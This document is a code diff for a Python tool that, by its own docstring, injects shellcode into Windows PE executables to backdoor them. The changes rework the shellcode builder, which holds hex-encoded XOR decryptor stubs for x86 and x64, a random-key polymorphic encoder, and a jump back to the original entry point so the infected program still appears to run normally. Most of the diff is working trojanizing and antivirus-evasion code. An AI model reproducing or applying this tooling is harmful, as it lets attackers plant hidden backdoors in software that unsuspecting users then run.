@@ -25,7 +25,7 @@ This python tool injects shellcode in Windows Program Executable to
 backdoor it with optional polymorphism.
 """
 
-__version__ = "0.0.1"
+__version__ = "0.0.2"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -158,10 +158,10 @@ def parse_pe_file(executable: str) -> Tuple[memoryview, PeInjectorData]:
     injector_data = PeInjectorData()
 
     injector_data.address_nt_headers = int.from_bytes(
-        file_mapping[0x3C:0x3C + 4], "little"
+        file_mapping[0x3C : 0x3C + 4], "little"
     )
 
-    nt_headers = file_mapping[injector_data.address_nt_headers:]
+    nt_headers = file_mapping[injector_data.address_nt_headers :]
     image_headers = nt_headers[4:]
     injector_data.machine_architecture = int.from_bytes(
         image_headers[0:2], "little"
@@ -187,7 +187,7 @@ def parse_pe_file(executable: str) -> Tuple[memoryview, PeInjectorData]:
         optional_headers[0x38:0x3C], "little"
     )
 
-    section_headers = optional_headers[injector_data.optional_headers_size:]
+    section_headers = optional_headers[injector_data.optional_headers_size :]
 
     if machine_types[injector_data.machine_architecture] == "x64":
         injector_data.image_base = int.from_bytes(
@@ -212,8 +212,7 @@ def parse_pe_file(executable: str) -> Tuple[memoryview, PeInjectorData]:
         injector_data.last_section.address_headers + 0x28
     )
     last_section_headers = section_headers[
-        injector_data.last_section.address_headers:
-        injector_data.address_new_section_headers
+        injector_data.last_section.address_headers : injector_data.address_new_section_headers
     ]
 
     injector_data.last_section.virtual_address = int.from_bytes(
@@ -241,54 +240,6 @@ def build_injected_shellcode(
 
     original_entry_point = injector_data.entry_point + injector_data.image_base
 
-    if machine_types[injector_data.machine_architecture] == "x64":
-        rex_instruction = b"\x48"
-        crypter = bytes.fromhex(
-            "eb24584889c248054f5f6f7f48c7c1aa0000008"
-            "a1830cb881848ffc84839c27ef248ffc0ffe0e8d7ffffff"
-        )
-        original_entry_point = original_entry_point.to_bytes(8, "little")
-    elif machine_types[injector_data.machine_architecture] == "x86":
-        rex_instruction = b""
-        crypter = bytes.fromhex(
-            "eb1d5889c2054f5f6f7fc7c1aa0000008a183"
-            "0cb8818ffc839c27ef440ffe0e8deffffff"
-        )
-        original_entry_point = original_entry_point.to_bytes(4, "little")
-
-    injector_data.shellcode += (
-        rex_instruction + b"\xb8" + original_entry_point + b"\xff\xe0"
-    )
-
-    if polymorphism:
-        key = randrange(256)
-        shellcode_length = len(injector_data.shellcode)
-        crypter = crypter.replace(b"\xaa", key.to_bytes()).replace(
-            b"\x4f\x5f\x6f\x7f", shellcode_length.to_bytes(4, "little")
-        )
-        injector_data.shellcode = crypter + bytes(
-            (byte ^ key for byte in injector_data.shellcode)
-        )
-
-
-def inject_section_headers(
-    injector_data: PeInjectorData,
-    memory_file_mapping: memoryview,
-    polymorphism: bool,
-) -> Tuple[int, int, int]:
-    """
-    This function inject the section headers.
-
-    This function returns the new image size, the new entry point
-    and the last section end address.
-    """
-
-    shellcode_length = len(injector_data.shellcode)
-    file_padding = shellcode_length % injector_data.file_aligment
-    file_new_section_size = shellcode_length + (
-        (injector_data.file_aligment - file_padding) if file_padding else 0
-    )
-
     last_section_virtual_end_address = (
         injector_data.last_section.virtual_size
         + injector_data.last_section.virtual_address
@@ -300,6 +251,69 @@ def inject_section_headers(
         (injector_data.section_aligment - virtual_padding)
         if virtual_padding
         else 0
+    )
+
+    if machine_types[injector_data.machine_architecture] == "x64":
+        # rex_instruction = b"\x48"
+        crypter = bytes.fromhex(
+            "eb24584889c248054f5f6f7f48c7c1aa0000008"
+            "a1830cb881848ffc84839c27ef248ffc0ffe0e8d7ffffff"
+        )
+    elif machine_types[injector_data.machine_architecture] == "x86":
+        # rex_instruction = b""
+        crypter = bytes.fromhex(
+            "eb1d5889c2054f5f6f7fc7c1aa0000008a183"
+            "0cb8818ffc839c27ef440ffe0e8deffffff"
+        )
+
+    # injector_data.shellcode += (
+    #     rex_instruction + b"\xb8" + original_entry_point + b"\xff\xe0"
+    # )
+
+    if polymorphism:
+        key = randrange(256)
+        shellcode_length = len(injector_data.shellcode) + 5
+        crypter = crypter.replace(b"\xaa", key.to_bytes()).replace(
+            b"\x4f\x5f\x6f\x7f", shellcode_length.to_bytes(4, "little")
+        )
+        injector_data.shellcode = crypter + bytes(
+            (byte ^ key for byte in injector_data.shellcode)
+        )
+
+    suffix = b"\xe9" + (
+        original_entry_point
+        - (
+            injector_data.new_values.entry_point
+            + len(injector_data.shellcode)
+            + 5
+            + injector_data.image_base
+        )
+    ).to_bytes(4, "little", signed=True)
+
+    if polymorphism:
+        injector_data.shellcode += bytes(
+            byte ^ key
+            for byte in suffix
+        )
+
+    injector_data.shellcode += suffix
+
+
+def inject_section_headers(
+    injector_data: PeInjectorData,
+    memory_file_mapping: memoryview,
+    polymorphism: bool,
+) -> int:
+    """
+    This function inject the section headers.
+
+    This function returns the end address of the last section.
+    """
+
+    shellcode_length = len(injector_data.shellcode)
+    file_padding = shellcode_length % injector_data.file_aligment
+    file_new_section_size = shellcode_length + (
+        (injector_data.file_aligment - file_padding) if file_padding else 0
     )
 
     last_section_file_end_address = (
@@ -329,13 +343,12 @@ def inject_section_headers(
 
     # assert len(new_section_headers) == 0x28
 
-    nt_headers = memory_file_mapping[injector_data.address_nt_headers:]
+    nt_headers = memory_file_mapping[injector_data.address_nt_headers :]
     optional_headers = nt_headers[0x18:]
-    section_headers = optional_headers[injector_data.optional_headers_size:]
+    section_headers = optional_headers[injector_data.optional_headers_size :]
 
     section_headers[
-        injector_data.address_new_section_headers:
-        injector_data.address_new_section_headers
+        injector_data.address_new_section_headers : injector_data.address_new_section_headers
         + 0x28
     ] = new_section_headers
 
@@ -357,7 +370,7 @@ def rewrite_pe_headers(
     This function writes new value for PE headers.
     """
 
-    nt_headers = memory_file_mapping[injector_data.address_nt_headers:]
+    nt_headers = memory_file_mapping[injector_data.address_nt_headers :]
     image_headers = nt_headers[4:]
     optional_headers = nt_headers[0x18:]
 
